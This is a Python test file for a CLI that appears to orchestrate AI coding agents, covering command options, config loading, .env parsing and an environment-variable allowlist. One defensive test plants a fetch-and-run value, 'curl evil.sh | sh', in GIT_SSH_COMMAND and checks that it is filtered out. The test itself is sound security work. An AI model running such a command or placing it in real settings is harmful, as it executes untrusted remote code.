"""Pure-unit tests for the rails CLI skeleton.

No Postgres, no JWKS server, no api/ fixtures -- these tests only exercise
rails.cli / rails.config in-process via typer.testing.CliRunner.
"""

import dataclasses
import os
import shutil
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from rails.cli import ENGINES, app
from rails.config import RailsConfig, RailsConfigError
from rails.gate import GateResult, StepResult

runner = CliRunner()

COMMANDS = ("build-feature", "triage", "migrate", "review", "gate", "engines")


def make_config(**over):
    """Direct construction for tests that don't need repo_root discovery."""
    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
    defaults.update(over)
    return RailsConfig(**defaults)


# --- CLI: --help -------------------------------------------------------


def test_help_exits_zero_and_lists_all_commands():
    result = runner.invoke(app, ["--help"])
    assert result.exit_code == 0
    for command in COMMANDS:
        assert command in result.output


# --- CLI: engines --------------------------------------------------------


def test_engines_all_present(monkeypatch):
    monkeypatch.setattr(shutil, "which", lambda name: f"/usr/local/bin/{name}")

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    for engine in ENGINES:
        assert engine in result.output
    assert "missing" not in result.output.lower()


def test_engines_one_missing(monkeypatch):
    def fake_which(name):
        return None if name == "codex" else f"/usr/local/bin/{name}"

    monkeypatch.setattr(shutil, "which", fake_which)

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    lines = {line.split()[0]: line for line in result.output.splitlines() if line.strip()}
    assert "missing" in lines["codex"].lower()
    assert "missing" not in lines["claude"].lower()
    assert "missing" not in lines["gemini"].lower()


def test_engines_one_line_per_engine_even_with_long_paths(monkeypatch):
    """Output must be pipe-safe: no terminal-width wrapping, one engine = one
    line no matter how long the resolved binary path is."""
    long_dir = "/very/long/prefix" * 8  # > 100 chars
    monkeypatch.setattr(shutil, "which", lambda name: f"{long_dir}/{name}")

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    lines = [line for line in result.output.splitlines() if line.strip()]
    assert len(lines) == len(ENGINES)
    for engine, line in zip(ENGINES, lines):
        assert line.startswith(engine)


# --- CLI: build-feature (wired in Task 6) ------------------------------


def test_build_feature_help_shows_engine_reviewer_no_pr_flags():
    # Introspect the command's declared options rather than the RENDERED help
    # string: under a narrow non-TTY with color forced on (CI), rich wraps the
    # option cells and interleaves ANSI codes, so a substring match on the
    # rendered `--help` output is width/color-dependent and flaky. The real
    # contract is that these options exist with the documented help.
    from typer.main import get_command

    build_feature_cmd = get_command(app).commands["build-feature"]
    opts = {opt for param in build_feature_cmd.params for opt in getattr(param, "opts", [])}
    assert {"--engine", "--reviewer", "--no-pr"} <= opts

    no_pr = next(p for p in build_feature_cmd.params if "--no-pr" in getattr(p, "opts", []))
    # M3: the --no-pr help documents that it leaves the worktree/branch for
    # inspection.
    assert "inspection" in (no_pr.help or "")


def test_build_feature_calls_agent_with_spec_and_defaults(monkeypatch):
    seen = {}

    def fake_build_feature(cfg, spec, *, engine, reviewer, open_pr):
        seen["cfg"] = cfg
        seen["spec"] = spec
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._build_feature", fake_build_feature)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["build-feature", "add a widget"])

    assert result.exit_code == 0
    assert seen["spec"] == "add a widget"
    assert seen["engine"] is None
    assert seen["reviewer"] is None
    assert seen["open_pr"] is True


def test_build_feature_plumbs_engine_reviewer_and_no_pr_flags(monkeypatch):
    seen = {}

    def fake_build_feature(cfg, spec, *, engine, reviewer, open_pr):
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._build_feature", fake_build_feature)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(
        app,
        [
            "build-feature",
            "add a widget",
            "--engine",
            "codex",
            "--reviewer",
            "claude",
            "--no-pr",
        ],
    )

    assert result.exit_code == 0
    assert seen["engine"] == "codex"
    assert seen["reviewer"] == "claude"
    assert seen["open_pr"] is False


# --- CLI: triage (wired in Task 8) --------------------------------------


def test_triage_help_shows_event_engine_reviewer_no_pr_flags():
    from typer.main import get_command

    triage_cmd = get_command(app).commands["triage"]
    opts = {opt for param in triage_cmd.params for opt in getattr(param, "opts", [])}
    assert {"--event", "--engine", "--reviewer", "--no-pr"} <= opts


def test_triage_calls_agent_with_defaults(monkeypatch):
    seen = {}

    def fake_triage(cfg, *, event_id, engine, reviewer, open_pr):
        seen["cfg"] = cfg
        seen["event_id"] = event_id
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._triage", fake_triage)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["triage"])

    assert result.exit_code == 0
    assert seen["event_id"] is None
    assert seen["engine"] is None
    assert seen["reviewer"] is None
    assert seen["open_pr"] is True


def test_triage_plumbs_event_engine_reviewer_and_no_pr_flags(monkeypatch):
    seen = {}

    def fake_triage(cfg, *, event_id, engine, reviewer, open_pr):
        seen["event_id"] = event_id
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._triage", fake_triage)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(
        app,
        [
            "triage",
            "--event",
            "abc-123",
            "--engine",
            "codex",
            "--reviewer",
            "claude",
            "--no-pr",
        ],
    )

    assert result.exit_code == 0
    assert seen["event_id"] == "abc-123"
    assert seen["engine"] == "codex"
    assert seen["reviewer"] == "claude"
    assert seen["open_pr"] is False


def test_triage_exits_one_when_nothing_was_triaged(monkeypatch):
    monkeypatch.setattr("rails.cli._triage", lambda cfg, **kw: None)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["triage"])

    assert result.exit_code == 1


# --- CLI: migrate (wired in Task 8) -------------------------------------


def test_migrate_help_shows_engine_reviewer_no_pr_flags():
    from typer.main import get_command

    migrate_cmd = get_command(app).commands["migrate"]
    opts = {opt for param in migrate_cmd.params for opt in getattr(param, "opts", [])}
    assert {"--engine", "--reviewer", "--no-pr"} <= opts


def test_migrate_calls_agent_with_change_and_defaults(monkeypatch):
    seen = {}

    def fake_migrate(cfg, change, *, engine, reviewer, open_pr):
        seen["cfg"] = cfg
        seen["change"] = change
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._migrate", fake_migrate)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["migrate", "add index on vehicles.vin"])

    assert result.exit_code == 0
    assert seen["change"] == "add index on vehicles.vin"
    assert seen["engine"] is None
    assert seen["reviewer"] is None
    assert seen["open_pr"] is True


def test_migrate_plumbs_engine_reviewer_and_no_pr_flags(monkeypatch):
    seen = {}

    def fake_migrate(cfg, change, *, engine, reviewer, open_pr):
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._migrate", fake_migrate)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(
        app,
        [
            "migrate",
            "add index on vehicles.vin",
            "--engine",
            "codex",
            "--reviewer",
            "claude",
            "--no-pr",
        ],
    )

    assert result.exit_code == 0
    assert seen["engine"] == "codex"
    assert seen["reviewer"] == "claude"
    assert seen["open_pr"] is False


# --- CLI: review (wired in Task 8) ---------------------------------------


def test_review_help_shows_pr_range_engine_comment_flags():
    from typer.main import get_command

    review_cmd = get_command(app).commands["review"]
    opts = {opt for param in review_cmd.params for opt in getattr(param, "opts", [])}
    assert {"--pr", "--range", "--engine", "--comment"} <= opts


def test_review_requires_pr_or_range(monkeypatch):
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["review"])

    assert result.exit_code == 1
    assert "--pr" in result.stderr or "--range" in result.stderr


def test_review_pr_plumbs_flags_and_exits_zero_on_approve(monkeypatch):
    seen = {}

    def fake_review(cfg, *, pr, diff_range, engine, comment):
        seen["cfg"] = cfg
        seen["pr"] = pr
        seen["diff_range"] = diff_range
        seen["engine"] = engine
        seen["comment"] = comment
        return "APPROVE"

    monkeypatch.setattr("rails.cli._review", fake_review)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["review", "--pr", "42", "--engine", "codex", "--comment"])

    assert result.exit_code == 0
    assert seen["pr"] == "42"
    assert seen["diff_range"] is None
    assert seen["engine"] == "codex"
    assert seen["comment"] is True


def test_review_range_plumbs_flags(monkeypatch):
    seen = {}

    def fake_review(cfg, *, pr, diff_range, engine, comment):
        seen["pr"] = pr
        seen["diff_range"] = diff_range
        return "APPROVE"

    monkeypatch.setattr("rails.cli._review", fake_review)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["review", "--range", "main..feature"])

    assert result.exit_code == 0
    assert seen["pr"] is None
    assert seen["diff_range"] == "main..feature"


def test_review_exits_one_on_request_changes(monkeypatch):
    monkeypatch.setattr("rails.cli._review", lambda cfg, **kw: "REQUEST_CHANGES")
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["review", "--pr", "42"])

    assert result.exit_code == 1


# --- CLI: gate ---------------------------------------------------------


def test_gate_command_prints_summary_and_exits_zero_on_pass(monkeypatch):
    fake_result = GateResult(
        ok=True,
        steps=(
            StepResult(name="ruff-check", ok=True, exit_code=0, duration_s=0.1, output_tail=""),
        ),
    )
    monkeypatch.setattr("rails.cli.run_gate", lambda cwd, **kw: fake_result)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 0
    assert "ruff-check" in result.stdout
    assert "✓" in result.stdout


def test_gate_command_exits_one_and_prints_failure_tail_on_red_gate(monkeypatch):
    fake_result = GateResult(
        ok=False,
        steps=(
            StepResult(name="pytest", ok=False, exit_code=1, duration_s=0.2, output_tail="boom"),
        ),
    )
    monkeypatch.setattr("rails.cli.run_gate", lambda cwd, **kw: fake_result)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 1
    assert "pytest" in result.stdout
    assert "boom" in result.stdout


def test_gate_command_passes_repo_root_from_config(monkeypatch, tmp_path):
    seen_cwd = {}

    def fake_run_gate(cwd, **kw):
        seen_cwd["cwd"] = cwd
        return GateResult(ok=True, steps=())

    monkeypatch.setattr("rails.cli.run_gate", fake_run_gate)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config(repo_root=tmp_path)))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 0
    assert seen_cwd["cwd"] == tmp_path


# --- RailsConfig.load() -----------------------------------------------------


def test_config_load_defaults(monkeypatch):
    monkeypatch.delenv("RAILS_ENGINE", raising=False)
    monkeypatch.delenv("RAILS_MAX_BUDGET_USD", raising=False)

    cfg = RailsConfig.load()

    assert cfg.engine == "claude"
    assert cfg.max_budget_usd == 2.0
    assert cfg.repo_root.is_dir()
    assert (cfg.repo_root / "pyproject.toml").is_file()


def test_config_load_reads_env(monkeypatch):
    monkeypatch.setenv("RAILS_ENGINE", "codex")
    monkeypatch.setenv("RAILS_MAX_BUDGET_USD", "5.5")

    cfg = RailsConfig.load()

    assert cfg.engine == "codex"
    assert cfg.max_budget_usd == 5.5


def test_config_load_outside_git_repo_raises_typed_error(monkeypatch):
    def fail_run(*args, **kwargs):
        raise subprocess.CalledProcessError(128, ["git", "rev-parse", "--show-toplevel"])

    import rails.config

    monkeypatch.setattr(rails.config.subprocess, "run", fail_run)

    with pytest.raises(RailsConfigError, match="not inside a git repository"):
        RailsConfig.load()


def test_config_load_bad_budget_raises_typed_error(monkeypatch):
    monkeypatch.setenv("RAILS_MAX_BUDGET_USD", "lots")

    with pytest.raises(RailsConfigError, match="RAILS_MAX_BUDGET_USD must be a number, got 'lots'"):
        RailsConfig.load()


def test_config_is_frozen():
    cfg = make_config()
    with pytest.raises(dataclasses.FrozenInstanceError):
        cfg.engine = "gemini"


# --- RailsConfig.load(): .env auto-load (audit bug 2) -----------------------
#
# `uv run rails ...` (bypassing the `just` recipes, which dotenv-load via
# `set dotenv-load := true`) previously left os.environ exactly as the shell
# gave it, so a bare `uv run rails triage` failed with a missing
# SUPABASE_URL/SERVICE_ROLE_KEY. RailsConfig.load() must auto-load the repo
# root's `.env` (tiny stdlib parser, no python-dotenv dependency) WITHOUT
# overriding a variable the real environment already set -- CI sets real env
# and typically has no `.env` file at all, so this is a pure local-dev
# convenience with no CI behavior change.


def test_load_dotenv_if_present_sets_unset_vars_only(monkeypatch, tmp_path):
    from rails.config import _load_dotenv_if_present

    (tmp_path / ".env").write_text(
        "NEW_VAR=hello\n"
        "EXISTING_VAR=should-not-be-used\n"
        "# a comment line, skipped\n"
        "\n"
        "QUOTED_VAR='single quoted'\n"
        'DQUOTED_VAR="double quoted"\n'
        "MALFORMED LINE WITHOUT EQUALS -- skipped, never raises\n"
        "export EXPORTED_VAR=exported-value\n"
    )
    monkeypatch.delenv("NEW_VAR", raising=False)
    monkeypatch.setenv("EXISTING_VAR", "real-value")
    monkeypatch.delenv("QUOTED_VAR", raising=False)
    monkeypatch.delenv("DQUOTED_VAR", raising=False)
    monkeypatch.delenv("EXPORTED_VAR", raising=False)

    try:
        _load_dotenv_if_present(tmp_path)

        assert os.environ["NEW_VAR"] == "hello"
        # a var the real environment already set is NEVER overridden
        assert os.environ["EXISTING_VAR"] == "real-value"
        assert os.environ["QUOTED_VAR"] == "single quoted"
        assert os.environ["DQUOTED_VAR"] == "double quoted"
        assert os.environ["EXPORTED_VAR"] == "exported-value"
    finally:
        for key in ("NEW_VAR", "QUOTED_VAR", "DQUOTED_VAR", "EXPORTED_VAR"):
            os.environ.pop(key, None)


def test_load_dotenv_if_present_missing_file_is_a_noop(tmp_path):
    from rails.config import _load_dotenv_if_present

    # tmp_path has no .env at all -- must not raise.
    _load_dotenv_if_present(tmp_path)


def test_config_load_auto_loads_dotenv_without_overriding_real_env(monkeypatch, tmp_path):
    """End-to-end through RailsConfig.load() itself (not just the parser
    helper): a fresh `.env` key becomes available, but a pre-existing
    os.environ value for the same key always wins."""
    (tmp_path / ".env").write_text(
        "RAILS_DOTENV_TEST_NEW=from-dotenv\nRAILS_DOTENV_TEST_EXISTING=should-not-win\n"
    )
    monkeypatch.delenv("RAILS_DOTENV_TEST_NEW", raising=False)
    monkeypatch.setenv("RAILS_DOTENV_TEST_EXISTING", "real-env-wins")

    def fake_run(*args, **kwargs):
        return subprocess.CompletedProcess(args, 0, stdout=f"{tmp_path}\n", stderr="")

    import rails.config

    monkeypatch.setattr(rails.config.subprocess, "run", fake_run)

    try:
        RailsConfig.load()

        assert os.environ["RAILS_DOTENV_TEST_NEW"] == "from-dotenv"
        assert os.environ["RAILS_DOTENV_TEST_EXISTING"] == "real-env-wins"
    finally:
        os.environ.pop("RAILS_DOTENV_TEST_NEW", None)


# --- RailsConfig.allowed_env() ----------------------------------------------


def test_allowed_env_excludes_canary_and_includes_path(monkeypatch):
    monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
    cfg = make_config()

    env = cfg.allowed_env()

    assert "RAILS_TEST_CANARY" not in env
    assert "PATH" in env
    assert env["PATH"] == os.environ["PATH"]


def test_allowed_env_includes_git_identity_vars(monkeypatch):
    monkeypatch.setenv("GIT_AUTHOR_NAME", "Rails Bot")
    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "rails@nextlane.dev")
    monkeypatch.setenv("GIT_COMMITTER_NAME", "Rails Bot")
    monkeypatch.setenv("GIT_COMMITTER_EMAIL", "rails@nextlane.dev")
    cfg = make_config()

    env = cfg.allowed_env()

    assert env.get("GIT_AUTHOR_NAME") == "Rails Bot"
    assert env.get("GIT_AUTHOR_EMAIL") == "rails@nextlane.dev"
    assert env.get("GIT_COMMITTER_NAME") == "Rails Bot"
    assert env.get("GIT_COMMITTER_EMAIL") == "rails@nextlane.dev"


def test_allowed_env_excludes_git_execution_and_isolation_hooks(monkeypatch):
    """GIT_* must NOT be forwarded wholesale: several GIT_ vars are
    command-execution hooks (GIT_SSH_COMMAND, GIT_ASKPASS) or worktree
    isolation escapes (GIT_DIR, GIT_WORK_TREE, GIT_CONFIG_COUNT)."""
    dangerous = {
        "GIT_SSH_COMMAND": "curl evil.sh | sh",
        "GIT_ASKPASS": "/tmp/evil-askpass",
        "GIT_DIR": "/somewhere/else/.git",
        "GIT_WORK_TREE": "/somewhere/else",
        "GIT_CONFIG_COUNT": "1",
    }
    for key, value in dangerous.items():
        monkeypatch.setenv(key, value)
    cfg = make_config()

    env = cfg.allowed_env()

    for key in dangerous:
        assert key not in env


def test_allowed_env_merges_explicit_extras(monkeypatch):
    monkeypatch.delenv("RAILS_TEST_EXTRA", raising=False)
    cfg = make_config()

    env = cfg.allowed_env(extra={"RAILS_TEST_EXTRA": "explicit-value"})

    assert env["RAILS_TEST_EXTRA"] == "explicit-value"
